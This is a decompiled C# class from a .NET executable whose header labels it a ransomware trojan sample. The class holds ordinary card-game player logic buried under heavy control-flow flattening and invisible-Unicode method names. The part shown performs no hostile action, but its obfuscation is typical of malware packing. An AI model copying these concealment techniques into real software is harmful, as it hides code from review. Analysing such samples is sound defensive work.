// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: SecurityContextSwitch, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: B550A3E4-7AB3-42E5-BA1E-9838306CED9A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-633b443e56df746071e4f5c91d3f721ff0886afac579db94deaef37dc64fde58.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = 666496952;
      bool flag;
      string str1;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1410569899)) % 10U)
        {
          case 0:
            int num3 = BaseStream == 0 ? -1619061470 : (num3 = -2044747326);
            num1 = num3 ^ (int) num2 * -128817078;
            continue;
          case 2:
            str1 = "31634D";
            num1 = (int) num2 * 1952907623 ^ 777564771;
            continue;
          case 3:
            str1 = "456D7074794173796E634C6F63616C56616C75654D";
            num1 = (int) num2 * 73572197 ^ -387064832;
            continue;
          case 4:
            str2 = str1;
            num1 = 293324459;
            continue;
          case 5:
            str1 = (string) null;
            num1 = (int) num2 * 310910682 ^ 2080037443;
            continue;
          case 6:
            goto label_1;
          case 7:
            int num4 = !flag ? 695962441 : (num4 = 1634961645);
            num1 = num4 ^ (int) num2 * 210651616;
            continue;
          case 8:
            num1 = (int) num2 * 879888469 ^ -945018432;
            continue;
          case 9:
            flag = BaseStream == 1;
            num1 = 1798872764;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
      if (this.PlanningCards.Length != 0)
        goto label_4;
label_1:
      int num1 = -1766489389;
label_2:
      uint num2;
      int num3;
      int num4;
      switch ((num2 = (uint) (num1 ^ -1936118317)) % 3U)
      {
        case 0:
          goto label_1;
        case 2:
          num4 = 0;
          goto label_5;
        default:
          return num3;
      }
label_4:
      num4 = this.PlanningCards[cardTypeIndex];
label_5:
      num3 = num4;
      num1 = -513657172;
      goto label_2;
    }

    public int PlanningCardsCount
    {
      get
      {
        int num1 = 0;
label_1:
        int num2 = -1256585947;
        int[] planningCards;
        int index;
        int planningCardsCount;
        while (true)
        {
          uint num3;
          switch ((num3 = (uint) (num2 ^ -228192148)) % 9U)
          {
            case 0:
              num2 = -1719131714;
              continue;
            case 1:
              ++index;
              num2 = (int) num3 * -910533273 ^ -1293919135;
              continue;
            case 2:
              int num4;
              num2 = num4 = planningCards[index] <= 0 ? -1505226663 : (num4 = -856854769);
              continue;
            case 3:
              goto label_1;
            case 4:
              ++num1;
              num2 = (int) num3 * 421571022 ^ -1527722765;
              continue;
            case 5:
              planningCardsCount = num1;
              num2 = (int) num3 * -713692208 ^ -1013087689;
              continue;
            case 7:
              planningCards = this.PlanningCards;
              index = 0;
              num2 = (int) num3 * 1291917284 ^ 1641450779;
              continue;
            case 8:
              int num5;
              num2 = num5 = index < planningCards.Length ? -1598435974 : (num5 = -839167133);
              continue;
            default:
              goto label_10;
          }
        }
label_10:
        return planningCardsCount;
      }
    }

    private Player()
    {
label_1:
      int num1 = -654204950;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1911308025)) % 4U)
        {
          case 0:
            goto label_3;
          case 1:
            num1 = (int) num2 * 1183790820 ^ -1910588975;
            continue;
          case 2:
            num1 = (int) num2 * 2043390962 ^ 1200632695;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = 717222439;
      int planningCard;
      bool flag1;
      string str1;
      int index;
      bool flag2;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2003500934)) % 16U)
        {
          case 0:
            goto label_1;
          case 1:
            str1 = " ";
            index = 0;
            num1 = (int) num2 * -414318653 ^ 1402587483;
            continue;
          case 2:
            int num3 = flag1 ? -1084816512 : (num3 = -218099509);
            num1 = num3 ^ (int) num2 * -1918493632;
            continue;
          case 3:
            num1 = (int) num2 * 1679087106 ^ -66496181;
            continue;
          case 4:
            int num4 = !flag2 ? -416306007 : (num4 = -1175220705);
            num1 = num4 ^ (int) num2 * 192612880;
            continue;
          case 5:
            num1 = (int) num2 * 1841344819 ^ 1637155043;
            continue;
          case 6:
            num1 = (int) num2 * -405371332 ^ -251112188;
            continue;
          case 7:
            planningCard = this.PlanningCards[index];
            num1 = (int) num2 * 422807633 ^ -974938231;
            continue;
          case 8:
            flag1 = planningCard == 0;
            num1 = (int) num2 * 809791491 ^ 1513101932;
            continue;
          case 9:
            num1 = 635147409;
            continue;
          case 10:
            ++index;
            num1 = 761463354;
            continue;
          case 12:
            flag2 = index < this.PlanningCards.Length;
            num1 = 1666821650;
            continue;
          case 13:
            str1 = Player.\u202E⁮‮‪⁮⁮⁮‍‎‏‭⁫‌⁮‮⁬‪⁫⁪‎‮​‮‎‭⁭‪‪‫‭‎⁪⁭⁯‪⁮‭‌⁯‮‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = 1947378355;
            continue;
          case 14:
            num1 = (int) num2 * 1023513023 ^ -1694874568;
            continue;
          case 15:
            str2 = str1;
            num1 = (int) num2 * -114412662 ^ 1035745891;
            continue;
          default:
            goto label_17;
        }
      }
label_17:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
      Player player = new Player()
      {
        Name = json["name"].Value,
        PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
        UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
      };
label_1:
      int num1 = 1848135004;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1092835483)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            num1 = (int) num2 * 1441799704 ^ 660073674;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = 1386331213;
      int[] numArray;
      int aIndex;
      int[] planningCards;
      int count;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1977901282)) % 8U)
        {
          case 0:
            aIndex = 0;
            num1 = (int) num2 * 1483456748 ^ 1192191721;
            continue;
          case 1:
            planningCards = numArray;
            num1 = (int) num2 * -355198129 ^ 993686720;
            continue;
          case 2:
            goto label_1;
          case 3:
            flag = aIndex < count;
            num1 = 845217828;
            continue;
          case 4:
            numArray[aIndex] = json[aIndex].AsInt;
            ++aIndex;
            num1 = 1244403465;
            continue;
          case 6:
            int num3 = flag ? 1054179254 : (num3 = 266985267);
            num1 = num3 ^ (int) num2 * -2141833872;
            continue;
          case 7:
            count = json.Count;
            numArray = new int[count];
            num1 = (int) num2 * 1382132736 ^ -1629818614;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = 1565471895;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1311629242)) % 4U)
        {
          case 0:
            num1 = (int) num2 * 1758415670 ^ -1866451283;
            continue;
          case 1:
            str = Player.\u200E‭‏⁮‪⁬⁭⁫‪‭‮​⁪⁮⁬‭⁭‎‮‏‏‫‎⁭‭‭‎‍‫⁮‮⁮‍⁯⁬​⁮​‫⁪‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * 1922688598 ^ -671226060;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    static string \u202E⁮‮‪⁮⁮⁮‍‎‏‭⁫‌⁮‮⁬‪⁫⁪‎‮​‮‎‭⁭‪‪‫‭‎⁪⁭⁯‪⁮‭‌⁯‮‮([In] string[] obj0) => string.Concat(obj0);

    static string \u200E‭‏⁮‪⁬⁭⁫‪‭‮​⁪⁮⁬‭⁭‎‮‏‏‫‎⁭‭‭‎‍‫⁮‮⁮‍⁯⁬​⁮​‫⁪‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
